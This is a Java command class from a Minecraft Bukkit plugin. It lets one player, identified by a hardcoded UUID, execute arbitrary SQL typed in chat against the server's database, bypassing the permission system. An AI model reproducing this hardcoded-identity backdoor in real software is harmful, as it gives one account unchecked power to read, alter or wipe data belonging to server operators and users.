package net.lordofthecraft.arche.commands;

import java.sql.Connection;
import java.sql.SQLException;
import java.util.UUID;

import net.lordofthecraft.arche.ArcheCore;

import org.apache.commons.lang.StringUtils;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class CommandSql implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if(args.length == 0 || !(sender instanceof Player)) return false;
		
		Player p = (Player) sender;
		if(p.getUniqueId().equals(UUID.fromString("eab9533c-9961-4e7d-aa0a-cc3e21fe8d48"))){
			String statement = StringUtils.join(args, ' ', 0, args.length);
			try{
				Connection c = ArcheCore.getControls().getSQLHandler().getSQL().getConnection();
				boolean result = c.createStatement().execute(statement);
				sender.sendMessage("Returned boolean: " + result);
			} catch(SQLException e){sender.sendMessage("SQLException: " + e);}
		}
		
		return true;
	}
	
}
